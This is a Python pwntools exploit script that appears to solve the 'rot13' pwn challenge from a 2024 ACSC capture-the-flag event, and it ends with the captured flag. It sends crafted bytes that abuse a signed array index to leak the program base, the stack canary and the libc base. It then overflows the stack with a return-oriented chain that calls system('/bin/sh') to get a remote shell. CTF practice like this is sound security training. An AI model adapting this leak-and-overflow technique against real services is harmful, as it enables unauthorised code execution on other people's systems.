#!/usr/bin/python3

from pwn import *

exe = ELF('rot13_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                brva 0x1588
                brva 0x128C
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('rot13.chal.2024.ctf.acsc.asia', 9999)
else:
    p = process(exe.path)

GDB()
pa = b''
for i in range(8):
    pa += p8(0xff-7+i)
for i in range(8):
    pa += p8(0xff-23+i)
for i in range(8):
    pa += p8(0xff-23-12*8+i)
sla(b'Text: ', pa)
p.recvuntil(b'Result: ')
exe.address = u64(p.recv(8)) - 0x158d
canary = u64(p.recv(8))
libc.address = u64(p.recv(8)) - 0x829f7
info("exe.address: " + hex(exe.address))
info("canary: " + hex(canary))
info("libc.address: " + hex(libc.address))

pop_rdi = 0x000000000002a3e5+libc.address
pa = b'a' * 264 + flat(canary, 0, pop_rdi+1, pop_rdi,
                       next(libc.search(b'/bin/sh')), libc.sym.system)
sla(b'Text: ', pa)

p.interactive()
# ACSC{aRr4y_1nd3X_sh0uLd_b3_uNs1Gn3d}